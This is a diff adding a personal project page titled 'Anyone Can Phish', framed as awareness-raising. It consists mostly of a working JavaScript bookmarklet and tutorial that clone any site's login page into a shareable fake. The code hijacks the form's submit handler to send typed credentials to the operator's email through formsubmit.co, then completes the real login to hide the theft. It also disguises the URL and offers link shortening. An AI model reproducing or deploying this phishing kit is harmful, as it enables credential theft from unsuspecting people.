@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="Content-Style-Type" content="text/css" />
+  <meta name="author" content="Jacob Strieb" />
+  <meta name="date" content="2020-07-27" />
+  <meta name="dcterms.date" content="2020-07-27" />
+  <meta name="description" content="Anyone can create phishing pages using this bookmarklet" />
+  <title>Anyone Can Phish - Jacob Strieb Projects</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <link rel="stylesheet" href="/style.css" type="text/css" />
+</head>
+<body>
+<div class="menu">
+<ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about/">About</a></li>
+<li><a href="/projects/">Projects</a></li>
+<li><a href="/posts/">Posts</a></li>
+</ul>
+<hr />
+</div>
+<h1 id="anyone-can-phish">Anyone Can Phish</h1>
+<p>The goal of this project is to empower people by demonstrating how easy it is to create fake login pages for phishing attacks.</p>
+<blockquote>
+<p>Give a man a fish and you feed him for a day; teach a man to fish and you feed him for a lifetime.</p>
+</blockquote>
+<hr />
+<p>This page and project are both unfinished, are currently not released to the public, and may never be officially released! <strong>Please do not share this link!</strong></p>
+<p>To-do:</p>
+<ul>
+<li>Evaluate ethics of widespread release</li>
+<li>Improve instructions/documentation/UX</li>
+<li>Demo video</li>
+<li>Make GitHub repo public</li>
+<li>Create GitHub organization to host URL Pages using a different domain</li>
+<li>User testing</li>
+<li>Cross-browser testing</li>
+<li>Write-up explanation of how the source code works</li>
+<li>Post to Hacker News</li>
+</ul>
+<hr />
+<h1 id="tutorial">Tutorial</h1>
+<ol type="1">
+<li>Drag the following to your bookmarks bar.</li>
+</ol>
+<div class="button-container">
+<a class="button" href='javascript:(() => {
+  /* Constants */
+  /* Exit if no email has been entered */
+  const EMAIL = window.prompt("Enter your email: ");
+  if (!EMAIL) return;
+
+  const URL_PAGES = "https://jstrieb.github.io/urlpages";
+  const POST_PAGE = `https://formsubmit.co/${EMAIL}`;
+
+  /* Generate the b64 API functions */
+  var b64 = (() => {
+    function generateIndexDict(a) {
+      let result = {};
+      for (let i = 0; i < a.length; i++) {
+        result[a[i]] = i;
+      }
+      return result;
+    }
+    const _a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const _aRev = generateIndexDict(_a);
+    _aRev["-"] = _aRev["+"];
+    _aRev["_"] = _aRev["/"];
+
+    const _enc = new TextEncoder("utf-8");
+    const _dec = new TextDecoder("utf-8");
+
+    return {
+      encode: function(s) {
+        return this.binaryToBase64(this.asciiToBinary(s));
+      },
+
+      asciiToBinary: function(text) {
+        return _enc.encode(text);
+      },
+
+      binaryToBase64: function(originalBytes) {
+        let length = originalBytes.length;
+        let added = (length % 3 == 0) ? 0 : (3 - length % 3);
+        let bytes = new Uint8Array(length + added);
+        bytes.set(originalBytes);
+
+        let output = "";
+        for (let i = 0; i < bytes.length; i += 3) {
+          output += _a[ bytes[i] >>> 2 ];
+          output += _a[ ((bytes[i] & 0x3) << 4) | (bytes[i + 1] >>> 4) ];
+          output += _a[ ((bytes[i + 1] & 0xF) << 2) | (bytes[i + 2] >>> 6) ];
+          output += _a[ bytes[i + 2] & 0x3F ];
+        }
+
+        if (added > 0) {
+          output = output.slice(0, -added) + ("=".repeat(added));
+        }
+
+        return output;
+      },
+    }
+  })();
+
+  /* Generate the page -> base64 API functions */
+  var api = {
+    VERSION: "0.2.0",
+
+    getViewLink: function(pageData) {
+      var urlData = {
+        version: this.VERSION,
+        compressed: false,
+        body: pageData,
+      };
+
+      const hashObject = b64.encode(JSON.stringify(urlData));
+      return `${URL_PAGES}/#${hashObject}`;
+    },
+  };
+
+  /* Replace all relative URLs with absolute ones */
+    Array.from(document.querySelectorAll("[src],[href],[action]")).map(l => {
+        if ("src" in l) {
+            l.src = (new URL(l.src, document.baseURI)).href;
+        } else if ("href" in l) {
+            l.href = (new URL(l.href, document.baseURI)).href;
+        } else if ("action" in l) {
+            l.action = (new URL(l.action, document.baseURI)).href;
+    }
+        return l;
+    });
+
+  /* Save original form attributes */
+  /* This advanced version that prompts the user can be manually enabled.
+   const selector = window.prompt("Login form CSS selector", "form"); */
+  const selector = "form";
+  var form = document.querySelector(selector);
+  var original = { onsubmit: "" + (form.onsubmit ? form.onsubmit : "") };
+
+  /* Modify the location the form will submit to */
+  form.setAttribute("original", JSON.stringify(original));
+
+  /* Create an onsubmit function that will submit to Slack then submit it a
+   * second time */
+  var newOnsubmit = (async (submittedForm) => {
+    /* Prevent a captcha from popping up in formsend */
+    submittedForm.appendChild((() => {
+      var captcha = document.createElement("input");
+      captcha.id = "temporaryCaptcha";
+      captcha.name = "_captcha";
+      captcha.type = "hidden";
+      captcha.value = "false";
+      return captcha;
+    })());
+
+    /* Add a value noting the original URL the phishing page mimics */
+    submittedForm.prepend((() => {
+      var url = document.createElement("input");
+      url.id = "temporaryUrl";
+      url.name = "original_url";
+      url.type = "hidden";
+      url.value = "replaceme";
+      return url;
+    })());
+
+    /* Rename an attribute that can interfere with formsend */
+    var email = submittedForm.querySelector("[name=email]");
+    if (email) {
+      email.name = "user_email";
+    }
+
+    /* Send the data to Slack */
+    await fetch("replace22", {
+          mode: "no-cors",
+          method: "POST",
+          referrerPolicy: "origin",
+          body: new FormData(submittedForm),
+        });
+
+    /* Actually submit the form for real */
+    submittedForm.submit();
+
+    return false;
+  }).toString().replace("replaceme", document.baseURI).replace("replace22", POST_PAGE);
+  form.setAttribute("onsubmit", `(${newOnsubmit})(this); return false;`);
+
+  /* Change the path so it doesnt look like a URL Page */
+  var currentURL = new URL(document.baseURI);
+  var path = currentURL.pathname + currentURL.search;
+  /* This advanced version that prompts the user can be manually enabled.
+  const newPath = window.prompt("New path: ", path); */
+  const newPath = path;
+  var onload = (() => {
+    window.history.pushState("", "", "replaceme");
+    document.body.removeAttribute("onload");
+  }).toString().replace("replaceme", newPath);
+  document.body.setAttribute("onload", `(${onload})()`);
+
+  /* Generate a new URL */
+  var newURL = api.getViewLink(document.documentElement.outerHTML);
+
+  /* Overwrite the current page with a way to copy the generated URL */
+  document.body.innerHTML = "";
+  document.write(`
+<html>
+<head>
+  <style>
+        html {
+            font-family: sans-serif;
+            padding: 10px;
+        }
+
+        body {
+            padding: 15px;
+            display: block;
+            margin: auto;
+      margin-top: 4em;
+            max-width: 80ch;
+        }
+
+        button {
+            padding: 11px;
+            background: rgb(95, 158, 160);
+            color: white;
+            border: 0.5px solid white;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 5px;
+            margin-right: 5px;
+            cursor: pointer;
+        }
+
+        label {
+            display: block;
+            font-variant: small-caps;
+            margin-bottom: 5px;
+        }
+
+        input, textarea {
+            padding: 10px;
+            border: 0.5px solid black;
+            border-radius: 3px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            width: 100%;
+            resize: none;
+            font-family: sans-serif;
+        }
+
+        hr {
+            margin-top: 3em;
+            margin-bottom: 3em;
+            border: 0;
+            border-top: 0.5px solid rgba(200, 200, 200, 1);
+        }
+
+        footer hr {
+            margin-bottom: 1em;
+            border-top: 0.5px solid black;
+        }
+
+        footer p {
+            text-align: center;
+        }
+
+
+        /* View on GitHub SVG ribbon */
+        @media (max-width: 100ch) {
+            .ribbon {
+                width: 100px;
+                height: 100px;
+            }
+        }
+
+        .ribbon {
+            position: absolute;
+            top: 0;
+            right: 0;
+        }
+
+
+        /* Output area */
+        .output input {
+            background: rgba(235, 235, 235, 1);
+        }
+
+        .alert {
+            opacity: 0;
+            transition: opacity 0.25s;
+        }
+  </style>
+  <script>
+        /* Highlight the text in an input with a given ID */
+        function highlight(id) {
+            let output = document.querySelector("#" + id);
+            output.focus();
+            output.select();
+            output.setSelectionRange(0, output.value.length + 1);
+            return output;
+        }
+
+        /* Activated when the "Copy" button is pressed */
+        function onCopy(id) {
+            /* Select and copy */
+            const output = highlight(id);
+            document.execCommand("copy");
+
+            /* Alert the user that the text was successfully copied */
+            const alertArea = document.querySelector(".alert");
+            alertArea.innerText = "Copied " + output.value.length + " characters";
+            alertArea.style.opacity = "1";
+            setTimeout(() => { alertArea.style.opacity = 0; }, 3000);
+
+            /* Deselect */
+            output.selectionEnd = output.selectionStart;
+            output.blur();
+        }
+  </script>
+</head>
+<body>
+    <!-- View on GitHub ribbon -->
+    <a href="https://github.com/jstrieb/anyone-can-phish" target="_blank">
+        <img class="ribbon" src="https://jstrieb.github.io/link-lock/corner-ribbon-minified.svg" alt="View on GitHub" />
+    </a>
+
+    <!-- Explanatory message -->
+    <p>The link below is a fake login page. Whenever someone enters a username and password at the fake login page, it will send them in an email to <a href="mailto:${EMAIL}">${EMAIL}</a>. The email comes from <a href="https://formsend.co">formsend.co</a>. The first time an email from Formsend is received, you must confirm your address by hitting the big green button in the message. Once confirmed, any logins at the fake page will be sent directly to the email address.</p>
+
+    <p>The fake page below is a modified clone of <a href="${document.baseURI}" target="_blank">${document.baseURI}</a>.</p>
+    <hr />
+
+    <!-- Output area -->
+    <div class="output">
+        <label for="output">fake login page url</label>
+        <input type="text" id="output" readonly />
+        <button id="copy" onclick="onCopy(&apos;output&apos;)">Copy</button>
+        <a href="" id="open" target="_blank" onclick="this.href = document.querySelector(&apos;#output&apos;).value"><button>Test in New Tab</button></a>
+        <!-- Special incantation to make TinyURL work -->
+        <form action="https://tinyurl.com/create.php" method="get" target="_blank" style="display: inline;" onsubmit="this.tinyurl.value = document.querySelector(&apos;#output&apos;).value;">
+            <input type="hidden" id="source" name="source" value="indexpage" />
+            <input type="hidden" id="tinyurl" name="url" value = "" />
+            <button>Get Shortened Link</button>
+        </form>
+        <p class="alert">Copied</p>
+    </div>
+
+    <!-- Page footer -->
+    <footer>
+    <hr />
+    <p class="copyright">Created by <a href="https://jstrieb.github.io">Jacob Strieb</a>.</p>
+    </footer>
+</body>
+</html>
+`);
+    document.querySelector("#output").value = newURL;
+
+  /* Open the URL Page in a new window for testing */
+  /* window.open(newURL, "", "left=10"); */
+})();
+'>Generate Phishing Page</a>
+</div>
+<ol start="2" type="1">
+<li><p>Click the bookmark above on any page with a login form. For example, navigate to <a href="https://cmu.edu/sio" class="uri">https://cmu.edu/sio</a>, and click the bookmark.</p></li>
+<li><p>Enter your email into the first prompt. When someone enters their credentials into the fake page, they will be automatically sent to the email you enter. If you don’t want to enter your real email, feel free to use a temporary email service such as <a href="https://10minutemail.com">10minutemail.com</a>.</p></li>
+<li><p>After these steps, a prompt will display the generated fake login page URL. Copy this link so that it does not get lost. When you have copied it, click “OK.”</p></li>
+<li><p>The fake login page will open in a new tab. Try entering a fake username and fake password. When you do this, you will receive an email from <code>formsubmit.co</code>. Click the green confirmation button in this email.</p></li>
+<li><p>After confirming your email, any credentials entered at the link you generated will be sent directly to your email.</p></li>
+</ol>
+<footer>
+<hr />
+Copyright &copy 2020 <a href="/about">Jacob Strieb</a>. All rights reserved.
+</footer>
+</body>
+</html>
